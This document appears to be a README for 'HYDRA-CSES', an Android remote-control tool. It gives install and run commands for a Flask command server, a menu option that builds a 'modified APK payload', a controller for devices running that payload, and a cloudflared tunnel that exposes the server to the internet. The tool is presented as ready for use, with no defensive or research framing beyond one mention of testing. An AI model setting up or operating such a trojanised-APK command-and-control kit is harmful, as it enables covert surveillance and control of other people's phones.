# HYDRA CLEAN, SIMPLE TO SETUP, EFFICIENT, SIMPLE TO USE 
Flask-based server: Handles communication, command dispatching, and client requests.  Android client: Sends data and listens for server responses.  APK decompilation/recompilation: Modified resources and rebuilt APKs to test dynamic communication.


# HYDRA-CSES

# Linux 
```
apt install -y git
```
#Termux
```
pkg install git -y
```
#Linux/Termux
```
git clone https://github.com/HackersNexus/HYDRA-CSES
cd HYDRA-CSES 
```
# Linux / Ubuntu / Kali
```
sudo apt update -y && sudo apt install -y python3 python3-pip
```
# Termux (Android)
```
pkg update -y && pkg install python -y
```
# Install dependencies
```
pip install flask requests
```
# Setup
```
python setup.py
```
# Run
```
python main.py
```
![HYDRA-CSES Menu](image.png)


## Options

**1 → Payload Creation**  
Build a modified APK payload with the configurations you set.  

**2 → Controller**  
Manage connections and interact with devices that use the payload.  

**3 → Run Server**  
Start the Flask server to handle requests and communication. 


#Port Forwarding using cloudflared
Termux/linux
```
apt install cloudflared
cloudflared tunnel -url <server_url>
```
